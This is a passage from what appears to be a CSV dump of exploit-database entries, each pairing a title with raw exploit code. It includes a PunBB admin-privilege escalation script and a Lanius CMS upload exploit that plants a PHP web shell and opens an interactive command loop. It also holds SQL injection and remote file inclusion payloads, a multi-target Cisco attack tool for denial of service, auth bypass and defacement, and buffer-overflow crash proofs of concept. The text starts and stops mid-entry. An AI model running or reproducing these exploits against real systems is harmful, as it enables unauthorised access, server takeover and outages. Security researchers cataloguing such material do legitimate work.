md5($cookie_seed.$pun_user['password']) !== $cookie['password_hash']) # ------------------------------------------------- # (c)oded by 1dt.w0lf // 09.03.2005 // r57 // www.rst.void.ru # ------------------------------------------------- # example: # r57punbb.pl nerf.ru /forum/ 2 47 # + Exploit success! # + Group membership saved! # + Now user with id=47 have admin level! # ja-ja-ja dast ist fantastish =) # ------------------------------------------------  $server    = $ARGV[0]; $folder    = $ARGV[1]; $admin_uid = $ARGV[2]; $user_uid  = $ARGV[3]; $suc = 0; if (@ARGV < 4 || $admin_uid =~ /[^\d]/ || $user_uid =~ /[^\d]/) {  print q{        PunBB version <= 1.2.2 auth bypass exploit   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  usage: r57punbb.pl [host] [/folder/] [admin_id] [user_id]   [host]     - hostname where punbb installed  [/folder/] - folder where punbb installed  [admin_id] - id of user who have admin rights  [user_id]  - user with this id get admin level after                success exploiting  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  r57 private code // rst.void.ru  };  exit(); } $server =~ s/^((?:http:\/\/)*)([^\/]*)(\/*)$/$2/; $str    = 'Group membership saved'; $cook   = 'a:2:{i:0;s:'.length($admin_uid).':""'.$admin_uid.'"";i:1;b:1;}'; $data   = 'form_sent=1&group_id=1&update_group_membership=Save'; $cook   =~ s/(.)/""%"".uc(sprintf(""%2.2x"",ord($1)))/eg;  $socket = IO::Socket::INET->new( Proto => ""tcp"", PeerAddr => ""$server"", PeerPort => ""80"") || die ""$socket error $!""; print $socket ""POST ${folder}profile.php?section=admin&id=$user_uid&action=foo HTTP/1.0\n""; print $socket ""Host: $server\n""; print $socket ""Referer: http://$server${folder}profile.php?section=admin&id=$user_uid\n""; print $socket ""Cookie: punbb_cookie=$cook\n""; print $socket ""Content-Type: application/x-www-form-urlencoded\n""; print $socket ""Content-Length: "".length($data).""\n\n""; print $socket ""$data\n\n""; while(<$socket>){ if(/$str/) { $suc = 1; last; } } ($suc)?(print ""+ Exploit success!\n+ $str!\n+ Now user with id=$user_uid have admin level!\n"")       :(print ""- Exploit failed\n"")        #--- EOF ---  # milw0rm.com [2005-03-29]",remote,webapps,1
15399,"Site2Nite Business eListings - SQL Injection Author: L0rd CrusAd3r aka VSN [crusader_hmg@yahoo.com] Exploit Title: Site2nite Businesses For Sale Listings SQL injection Version:FSBO Price:100$ Vendor url:http://www.site2nite.com/ Published: 2010-11-02 Thanx to:r0073r (inj3ct0r.com), Sid3^effects, MaYur, MA1201, Sonic, M4n0j,SeeMe, Th3 RDX. Greetz to : Inj3ct0r Exploit DataBase (inj3ct0r.com) Special Greetz: Topsecure.net,0xr00t.com,Andhrahackers.com Shoutzz:- To all ICW & Inj3ct0r members. .~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~..~.~.~.~.~~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~. Description:  List businesses for sale by owner and broker at prices you determine. ?8 pics per listing, advanced Search, detailed listings, full admin control panel. After sales support at no charge. Code: ASP 3.0 & VBScri ? .~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~..~.~.~.~.~~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~. Vulnerability:  *SQL injection Vulnerability*  DEMO URL :  http://server/detail.asp?ID=[SQLi]  .~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~..~.~.~.~.~~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~. .~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~..~.~.~.~.~~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~. # 0day n0 m0re # .~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~..~.~.~.~.~~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~. .~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~..~.~.~.~.~~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.   --  With R3gards, L0rd CrusAd3r",remote,webapps,1
46207,"Kepler Wallpaper Script 1.1 - SQL Injection # Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection # Dork: N/A # Date: 2019-01-19 # Exploit Author: Ihsan Sencan # Vendor Homepage: https://keplerwallpapers.online/ # Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script # Version: 1.1 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]//[PATH]/category/xxx[SQL] #   GET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate, br Cookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 HTTP/1.1 200 OK Date: Sat, 19 Jan 2019 09:01:06 GMT Server: Apache X-Powered-By: PHP/5.6.37 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Access-Control-Allow-Origin: * Strict-Transport-Security: max-age=31536000 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8",remote,webapps,1
5618,"Lanius CMS 1.2.16 - 'FCKeditor' Arbitrary File Upload <?php  /* 	-------------------------------------------------------------- 	La-Nai CMS <= 1.2.16 (fckeditor) Arbitrary File Upload Exploit 	-------------------------------------------------------------- 	 	author...: EgiX 	mail.....: n0b0d13s[at]gmail[dot]com 	 	link.....: http://sourceforge.net/projects/la-nai/  	[-] vulnerable code in /include/fckeditor/editor/filemanager/upload/php/upload.php 	 	41.	// Get the posted file. 	42.	$oFile = $_FILES['NewFile'] ; 	43.	 	44.	// Get the uploaded file name and extension. 	45.	$sFileName = $oFile['name'] ; 	46.	$sOriginalFileName = $sFileName ; 	47.	$sExtension = substr( $sFileName, ( strrpos($sFileName, '.') + 1 ) ) ; 	48.	$sExtension = strtolower( $sExtension ) ; 	49.	 	50.	// The the file type (from the QueryString, by default 'File'). 	51.	$sType = isset( $_GET['Type'] ) ? $_GET['Type'] : 'File' ; 	52.	 	53.	// Check if it is an allowed type. 	54.	if ( !in_array( $sType, array('File','Image','Flash','Media') ) ) 	55.	    SendResults( 1, '', '', 'Invalid type specified' ) ; 	56.	 	57.	// Get the allowed and denied extensions arrays. 	58.	$arAllowed	= $Config['AllowedExtensions'][$sType] ; 	59.	$arDenied	= $Config['DeniedExtensions'][$sType] ; 	60.	 	61.	// Check if it is an allowed extension. 	62.	if ( ( count($arAllowed) > 0 && !in_array( $sExtension, $arAllowed ) ) || ( count($arDenied) > 0 && in_array( $sExtension, $arDenied ) ) ) 	63.		SendResults( '202' ) ; 	64.	 	65.	$sErrorNumber	= '0' ; 	66.	$sFileUrl		= '' ; 	67.	 	68.	// Initializes the counter used to rename the file, if another one with the same name already exists. 	69.	$iCounter = 0 ; 	70.	 	71.	// The the target directory. 	72.	if ( isset( $Config['UserFilesAbsolutePath'] ) ) 	73.		$sServerDir = $Config['UserFilesAbsolutePath'] ; 	74.	else  	75.		//$sServerDir = GetRootPath() . $Config[""UserFilesPath""] ; 	76.		$sServerDir = $Config[""UserFilesPath""] ; 	77.	 	78.	while ( true ) 	79.	{ 	80.		// Compose the file path. 	81.		$sFilePath = $sServerDir . $sFileName ; 	82.	 	83.		// If a file with that name already exists. 	84.		if ( is_file( $sFilePath ) ) 	85.		{ 	86.			$iCounter++ ; 	87.			$sFileName = RemoveExtension( $sOriginalFileName ) . '(' . $iCounter . ').' . $sExtension ; 	88.			$sErrorNumber = '201' ; 	89.		} 	90.		else 	91.		{ 	92.			move_uploaded_file( $oFile['tmp_name'], $sFilePath ) ; 	93.	 	94.			if ( is_file( $sFilePath ) ) 	95.			{ 	96.				$oldumask = umask(0) ; 	97.				chmod( $sFilePath, 0777 ) ; 	98.				umask( $oldumask ) ; 	99.			} 	100.			 	101.			$sFileUrl = $Config[""UserFilesPath""] . $sFileName ; 	102.	 	103.			break ; 	104.		} 	 	with a default configuration of this script, an attacker might be able to upload arbitrary files containing malicious PHP code	 */  error_reporting(0); set_time_limit(0); ini_set(""default_socket_timeout"", 5);  function http_send($host, $packet) { 	$sock = fsockopen($host, 80); 	while (!$sock) 	{ 		print ""\n[-] No response from {$host}:80 Trying again...""; 		$sock = fsockopen($host, 80); 	} 	fputs($sock, $packet); 	while (!feof($sock)) $resp .= fread($sock, 1024); 	fclose($sock); 	return $resp; }  print ""\n+------------------------------------------------------------+""; print ""\n| La-Nai CMS <= 1.2.16 Arbitrary File Upload Exploit by EgiX |""; print ""\n+------------------------------------------------------------+\n"";  if ($argc < 2) { 	print ""\nUsage......: php $argv[0] host path""; 	print ""\nExample....: php $argv[0] localhost /lanai-cms/\n""; 	die(); }  $host = $argv[1]; $path = $argv[2];  $data  = ""--12345\r\n""; $data .= ""Content-Disposition: form-data; name=\""NewFile\""; filename=\""s.php.he.ll\""\r\n""; $data .= ""Content-Type: application/octet-stream\r\n\r\n""; $data .= ""<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\n""; $data .= ""--12345--\r\n"";  $packet  = ""POST {$path}include/fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.0\r\n""; $packet .= ""Host: {$host}\r\n""; $packet .= ""Content-Length: "".strlen($data).""\r\n""; $packet .= ""Content-Type: multipart/form-data; boundary=12345\r\n""; $packet .= ""Connection: close\r\n\r\n""; $packet .= $data;  preg_match(""/OnUploadCompleted\((.*),\""(.*)\"",\""(.*)\"",/i"", http_send($host, $packet), $html);  if (!in_array(intval($html[1]), array(0, 201))) die(""\n[-] Upload failed! (Error {$html[1]})\n""); else print ""\n[-] Shell uploaded to {$html[2]}...starting it!\n"";  define(STDIN, fopen(""php://stdin"", ""r""));  while(1) { 	print ""\nlanai-shell# ""; 	$cmd = trim(fgets(STDIN)); 	if ($cmd != ""exit"") 	{ 		$packet = ""GET {$path}datacenter/media/{$html[3]} HTTP/1.0\r\n""; 		$packet.= ""Host: {$host}\r\n""; 		$packet.= ""Cmd: "".base64_encode($cmd).""\r\n""; 		$packet.= ""Connection: close\r\n\r\n""; 		$output = http_send($host, $packet); 		if (eregi(""print"", $output) || !eregi(""_code_"", $output)) die(""\n[-] Exploit failed...\n""); 		$shell = explode(""_code_"", $output); 		print ""\n{$shell[1]}""; 	} 	else break; }  ?>  # milw0rm.com [2008-05-14]",remote,webapps,1
25085,"Microsoft Office XP 2000/2002 - HTML Link Processing Remote Buffer Overflow source: https://www.securityfocus.com/bid/12480/info  A remote buffer overflow vulnerability affects Microsoft Office XP. The problem presents itself when an unsuspecting user follows a malicious HTML link that points to a Office document. A boundary condition error is exposed during this operation that may allow attacker-specified data to corrupt process memory.  An attacker may leverage this issue to execute arbitrary code with the privileges of an unsuspecting user that follows a malicious embedded link.  <Script> var mylongstring,myjunk; mylongstring =""""; myjunk=""bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb bbbbbbbbbbbbbbbbbbb""; for(c=1;c<5000;c++) { mylongstring = mylongstring + myjunk; } window.open(""http://www.hhs.gov/ocr/privacysummary.rtf%0a""+mylongstring); </script>",remote,dos,1
47849,"SpotFTP FTP Password Recovery 3.0.0.0 - 'Key' Denial of Service (PoC) # Exploit Title: SpotFTP FTP Password Recovery 3.0.0.0 - 'Key' Denial of Service (PoC) # Exploit Author : Ismail Tasdelen # Exploit Date: 2020-01-06 # Vendor Homepage : http://www.nsauditor.com/ # Link Software : http://www.nsauditor.com/downloads/spotftp_setup.exe # Tested on OS: Windows 10 # CVE : N/A  ''' Proof of Concept (PoC): =======================  1.Download and install SpotFTP 2.Run the python operating script that will create a file (poc.txt) 3.Run the software ""Register -> Enter Registration Code 4.Copy and paste the characters in the file (poc.txt) 5.Paste the characters in the field 'Key' and click on 'Ok' 6.SpotFTP Crashed '''  #!/usr/bin/python      buffer = ""A"" * 1000   payload = buffer try:     f=open(""poc.txt"",""w"")     print(""[+] Creating %s bytes evil payload."" %len(payload))     f.write(payload)     f.close()     print(""[+] File created!"") except:     print(""File cannot be created."")",local,dos,1
22298,"Typo3 3.5 b5 - 'Translations.php' Remote File Inclusion source: https://www.securityfocus.com/bid/6984/info  TYPO3 is prone to an issue that may allow remote attackers to include files located on attacker-controlled servers.  This vulnerability is as a result of insufficient sanitization performed on remote user-supplied data. Under some circumstances, it is possible for remote attackers to influence the path for an include file to point to an external file by manipulating URI parameters.  If the remote file is a malicious file, this may be exploited to execute arbitrary system commands in the context of the web server.   http://localhost/<%3f %60echo %27<%3fpassthru(%5c%24c)%3f>%27 >> ./x.php%60 %3f> http://localhost/typo3/typo3/dev/translations.php?ONLY=relative_apache_path/apache/logs/error_log%00'",remote,webapps,1
40509,"Cisco Webex Player T29.10 - '.ARF' Out-of-Bounds Memory Corruption #####################################################################################  # Application: Cisco Webex Player # Platforms: Windows # Versions: Cisco Webex Meeting Player version T29.10 # Author: Francis Provencher of COSIG # Website: https://cosig.gouv.qc.ca/en/advisory/ # Twitter: @COSIG_ # Date: August 31, 2016 # CVE: CVE-2016-1415 # COSIG-2016-34  #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) POC  #######################################################################################  =================== 1) Introduction ===================  Cisco WebEx, formerly WebEx Communications Inc. is a company that provides on-demand collaboration, online meeting, web conferencing and videoconferencing applications. Its products include Meeting Center, Training Center, Event Center, Support Center, Sales Center, MeetMeNow, PCNow, WebEx AIM Pro Business Edition, WebEx WebOffice, and WebEx Connect. All WebEx products are part of the Cisco collaboration portfolio. All Cisco WebEx products are offered by Cisco Systems Inc.  (https://en.wikipedia.org/wiki/WebEx)  #######################################################################################  =================== 2) Report Timeline ===================  2016-05-25: Francis Provencher of COSIG report the vulnerability to Cisco PSIRT 2016-06-07: Cisco PSIRT confirm the vulnerability 2016-08-09: Cisco fixed the issue 2016-08-09: Advisory released  http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160831-meetings-player  #######################################################################################  =================== 3) Technical details ===================  The flaw exists within the parsing process of an invalid ARF file. An attacker can use this flaw to create an out-of-bound memory corruption which could allow for the execution of arbitrary code in the context of the current process.  #######################################################################################  ========== 4) POC ==========  https://cosig.gouv.qc.ca/wp-content/uploads/2016/09/COSIG-2016-34.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40509.zip  #######################################################################################",remote,dos,1
1846,Blend Portal 1.2.0 - 'phpBB Mod' Remote File Inclusion Blend Portal <= 1.2.0 for phpBB 2.x Remote File Inclusion Vulnerabilities Contacts > ICQ: 10072 MSN/Mail: nukedx@nukedx.com web: www.nukedx.com This exploits works on Blend Portal <= 1.2.0 for phpBB 2.x Original advisory can be found at: http://www.nukedx.com/?viewdoc=41 Succesful exploitation needs register_globals on & allow url_fopen on GET -> http://[victim]/[phpBB]/blend_data/blend_common.php?phpbb_root_path=[FILE] EXAMPLE -> http://[victim]/[phpBB]/blend_data/blend_common.php?phpbb_root_path=http://yoursite.com/cmd.txt? # nukedx.com [2006-05-28]  # milw0rm.com [2006-05-28],remote,webapps,1
22512,"Mod_NTLM 0.x - Authorisation Heap Overflow source: https://www.securityfocus.com/bid/7388/info  The mod_ntlm Apache module has been reported prone to a heap overflow vulnerability.  The vulnerability occurs due to a lack of sufficient bounds checking performed on user-supplied data, stored in heap memory. By supplying excessive data an attacker may trigger a buffer overflow and corrupt crucial memory management structures. This may result in the execution of arbitrary code in the context of the Apache server.  This vulnerability is reported to affect mod_ntlm <= v0.4 for Apache 1.3 and mod_ntlmv2 version 0.1 for Apache 2.0.   GET / HTTP/1.0 Authorization: [Ax3000]",remote,dos,1
2774,"Property Pro 1.0 - 'vir_Login.asp' Remote Authentication Bypass ******************************************************************************* # Title  :  Property Pro v1.0 (vir_Login.asp) Remote Login ByPass SQL Injection Vulnerability # Author :   ajann  ******************************************************************************* Example:  ###http://[target]/[path]/admin/  UserName: ' union select 0,0 from admin   """""""""""""""""""""""""""""""""""""""""" # ajann,Turkey # ...  # Im not Hacker!  # milw0rm.com [2006-11-13]",remote,webapps,1
11932,"xwine 1.0.1 - '.exe' Local Crash (PoC) # xwine v1.0.1 (.exe file) Local Crash PoC Exploit # Install: sudo apt-get install xwine # # Author: JosS <Jose Luis Gongora Fernandez> # mail: sys-project[at]hotmail[dot]com # site: http://hack0wn.com/ # team: Spanish Hackers Team - [SHT] # # This was written for educational purpose. Use it at your own risk. # Author will be not responsible for any damage.   <<crash.pl>>  #!/usr/local/bin/perl  chomp(my $version = `xwine --version`); if ($version =~ m/v1.0.1/) { print ""Starting PoC...\n""; # payload = ""xwine"" . ""A"" x 4096 . "".exe""; chomp(my $buffer = `xwine AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.exe`); # print ""$buffer\n\n""; } else { print ""\n[-] Xwine is not installed on the system\n\n""; exit(1); }",local,dos,1
20235,"Cisco Secure ACS for Windows NT 2.42 - Remote Buffer Overflow source: https://www.securityfocus.com/bid/1705/info  Depending on the data entered, CiscoSecure ACS for Windows NT can be made to crash or arbitrary code execution can be made possible if an unusually long packet is sent to port 2002.  If the application were to crash due to an oversized packet, the CSadmin Module would automatically restart after one minute in versions 2.3x and higher. Existing sessions would re-establish although they would need to be authenticated again. In prior versions, a restart is required in order to regain normal functionality.   #!/usr/bin/perl  ## # Cisco Global Exploiter # # Legal notes : # The BlackAngels staff refuse all responsabilities # for an incorrect or illegal use of this software # or for eventual damages to others systems. # # http://www.blackangels.it ##    ## # Modules ##  use Socket; use IO::Socket;   ## # Main ##  $host = """"; $expvuln = """"; $host = @ARGV[ 0 ]; $expvuln = @ARGV[ 1 ];  if ($host eq """") { usage(); } if ($expvuln eq """") { usage(); } if ($expvuln eq ""1"") { cisco1(); } elsif ($expvuln eq ""2"") { cisco2(); } elsif ($expvuln eq ""3"") { cisco3(); } elsif ($expvuln eq ""4"") { cisco4(); } elsif ($expvuln eq ""5"") { cisco5(); } elsif ($expvuln eq ""6"") { cisco6(); } elsif ($expvuln eq ""7"") { cisco7(); } elsif ($expvuln eq ""8"") { cisco8(); } elsif ($expvuln eq ""9"") { cisco9(); } elsif ($expvuln eq ""10"") { cisco10(); } elsif ($expvuln eq ""11"") { cisco11(); } elsif ($expvuln eq ""12"") { cisco12(); } elsif ($expvuln eq ""13"") { cisco13(); } elsif ($expvuln eq ""14"") { cisco14(); } else { printf ""\nInvalid vulnerability number ...\n\n""; exit(1); }   ## # Functions ##  sub usage {   printf ""\nUsage :\n"";   printf ""perl cge.pl <target> <vulnerability number>\n\n"";   printf ""Vulnerabilities list :\n"";   printf ""[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability\n"";   printf ""[2] - Cisco IOS Router Denial of Service Vulnerability\n"";   printf ""[3] - Cisco IOS HTTP Auth Vulnerability\n"";   printf ""[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability\n"";   printf ""[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability\n"";   printf ""[6] - Cisco 675 Web Administration Denial of Service Vulnerability\n"";   printf ""[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability\n"";   printf ""[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability\n"";   printf ""[9] - Cisco 514 UDP Flood Denial of Service Vulnerability\n"";   printf ""[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability\n"";   printf ""[11] - Cisco Catalyst Memory Leak Vulnerability\n"";   printf ""[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability\n"";   printf ""[13] - %u Encoding IDS Bypass Vulnerability (UTF)\n"";   printf ""[14] - Cisco IOS HTTP Denial of Service Vulnerability\n"";   exit(1); }  sub cisco1 # Cisco 677/678 Telnet Buffer Overflow Vulnerability {   my $serv = $host;   my $dch = ""?????????????????a~ %%%%%XX%%%%%"";   my $num = 30000;   my $string .= $dch x $num;   my $shc=""\015\012"";    my $sockd = IO::Socket::INET->new (                                      Proto => ""tcp"",                                      PeerAddr => $serv,                                      PeerPort => ""(23)"",                                      ) || die(""No telnet server detected on $serv ...\n\n"");    $sockd->autoflush(1);   print $sockd ""$string"". $shc;   while (<$sockd>){ print }   print(""\nPacket sent ...\n"");   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto => ""tcp"",                                       PeerAddr => $serv,                                       PeerPort => ""(23)"",                                       ) || die(""Vulnerability successful exploited. Target server is down ...\n\n"");    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   close($sockd2);   exit(1); }  sub cisco2 # Cisco IOS Router Denial of Service Vulnerability {   my $serv = $host;    my $sockd = IO::Socket::INET->new (                                      Proto=>""tcp"",                                      PeerAddr=>$serv,                                      PeerPort=>""http(80)"",);                                      unless ($sockd){die ""No http server detected on $serv ...\n\n""};   $sockd->autoflush(1);   print $sockd ""GET /\%\% HTTP/1.0\n\n"";   -close $sockd;   print ""Packet sent ...\n"";   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""http(80)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   close($sockd2);   exit(1); }  sub cisco3 # Cisco IOS HTTP Auth Vulnerability {   my $serv= $host;   my $n=16;   my $port=80;   my $target = inet_aton($serv);   my $fg = 0;    LAB: while ($n<100) {   my @results=exploit(""GET /level/"".$n.""/exec/- HTTP/1.0\r\n\r\n"");   $n++;   foreach $line (@results){           $line=~ tr/A-Z/a-z/;           if ($line =~ /http\/1\.0 401 unauthorized/) {$fg=1;}           if ($line =~ /http\/1\.0 200 ok/) {$fg=0;}   }    if ($fg==1) {                sleep(2);                print ""Vulnerability unsuccessful exploited ...\n\n"";               }   else {         sleep(2);         print ""\nVulnerability successful exploited with [http://$serv/level/$n/exec/....] ...\n\n"";         last LAB;        }    sub exploit {                my ($pstr)=@_;                socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||                die(""Unable to initialize socket ...\n\n"");                if(connect(S,pack ""SnA4x8"",2,$port,$target)){                                                             my @in;                                                             select(S);                                                             $|=1;                                                             print $pstr;                                                             while(<S>){ push @in, $_;}                                                             select(STDOUT); close(S); return @in;                                                            }   else { die(""No http server detected on $serv ...\n\n""); }   }   }   exit(1); }  sub cisco4 # Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability {   my $serv = $host;   my $n = 16;    while ($n <100) {                    exploit1(""GET /level/$n/exec/- HTTP/1.0\n\n"");                    $wr =~ s/\n//g;                    if ($wr =~ /200 ok/) {                                               while(1)                                               { print ""\nVulnerability could be successful exploited. Please choose a type of attack :\n"";                                                 print ""[1] Banner change\n"";                                                 print ""[2] List vty 0 4 acl info\n"";                                                 print ""[3] Other\n"";                                                 print ""Enter a valid option [ 1 - 2 - 3 ] : "";                                                 $vuln = <STDIN>;                                                 chomp($vuln);                     if ($vuln == 1) {                                     print ""\nEnter deface line : "";                                     $vuln = <STDIN>;                                     chomp($vuln);                                     exploit1(""GET /level/$n/exec/-/configure/-/banner/motd/$vuln HTTP/1.0\n\n"");                                    }                    elsif ($vuln == 2) {                                        exploit1(""GET /level/$n/exec/show%20conf HTTP/1.0\n\n"");                                        print ""$wrf"";                                       }                    elsif ($vuln == 3)                                       { print ""\nEnter attack URL : "";                                         $vuln = <STDIN>;                                         chomp($vuln);                                         exploit1(""GET /$vuln HTTP/1.0\n\n"");                                         print ""$wrf"";                                       }          }          }          $wr = """";          $n++;   }   die ""Vulnerability unsuccessful exploited ...\n\n"";    sub exploit1 {                 my $sockd = IO::Socket::INET -> new (                                                      Proto => 'tcp',                                                      PeerAddr => $serv,                                                      PeerPort => 80,                                                      Type => SOCK_STREAM,                                                      Timeout => 5);                                                      unless($sockd){die ""No http server detected on $serv ...\n\n""}   $sockd->autoflush(1);   $sockd -> send($_[0]);   while(<$sockd>){$wr .= $_} $wrf = $wr;   close $sockd;   }   exit(1); }  sub cisco5 # Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability {   my $serv = $host;   my $port = 22;   my $vuln = ""a%a%a%a%a%a%a%"";     my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No ssh server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   close($sockd);   exit(1); }  sub cisco6 # Cisco 675 Web Administration Denial of Service Vulnerability {   my $serv = $host;   my $port = 80;   my $vuln = ""GET ? HTTP/1.0\n\n"";     my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   sleep(2);   print ""\nServer response :\n\n"";   close($sockd);   exit(1); }  sub cisco7 # Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability {   my $serv = $host;   my $port = 80;   my $k = """";      print ""Enter a file to read [ /show/config/cr set as default ] : "";   $k = <STDIN>;   chomp ($k);   if ($k eq """")   {$vuln = ""GET /exec/show/config/cr HTTP/1.0\n\n"";}   else   {$vuln = ""GET /exec$k HTTP/1.0\n\n"";}    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   sleep(2);   print ""\nServer response :\n\n"";   while (<$sockd>){print}   close($sockd);   exit(1); }  sub cisco8 # Cisco IOS Software HTTP Request Denial of Service Vulnerability {   my $serv = $host;   my $port = 80;   my $vuln = ""GET /error?/ HTTP/1.0\n\n"";    my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No http server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   sleep(2);   print ""\nServer response :\n\n"";   while (<$sockd>){print}   close($sockd);   exit(1); }  sub cisco9 # Cisco 514 UDP Flood Denial of Service Vulnerability {   my $ip = $host;   my $port = ""514"";   my $ports = """";   my $size = """";   my $i = """";   my $string = ""%%%%%XX%%%%%"";    print ""Input packets size : "";   $size = <STDIN>;   chomp($size);    socket(SS, PF_INET, SOCK_DGRAM, 17);   my $iaddr = inet_aton(""$ip"");    for ($i=0; $i<10000; $i++)   { send(SS, $string, $size, sockaddr_in($port, $iaddr)); }    printf ""\nPackets sent ...\n"";   sleep(2);   printf ""Please enter a server's open port : "";   $ports = <STDIN>;   chomp $ports;   printf ""\nNow checking server status ...\n"";   sleep(2);    socket(SO, PF_INET, SOCK_STREAM, getprotobyname('tcp')) || die ""An error occuring while loading socket ...\n\n"";   my $dest = sockaddr_in ($ports, inet_aton($ip));   connect (SO, $dest) || die ""Vulnerability successful exploited. Target server is down ...\n\n"";    printf ""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"";   exit(1); }  sub cisco10 # CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability {   my $ip = $host;   my $vln = ""%%%%%XX%%%%%"";   my $num = 30000;   my $string .= $vln x $num;   my $shc=""\015\012"";    my $sockd = IO::Socket::INET->new (                                      Proto => ""tcp"",                                      PeerAddr => $ip,                                      PeerPort => ""(2002)"",                                     ) || die ""Unable to connect to $ip:2002 ...\n\n"";    $sockd->autoflush(1);   print $sockd ""$string"" . $shc;   while (<$sockd>){ print }   print ""Packet sent ...\n"";   close($sockd);   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$ip,                               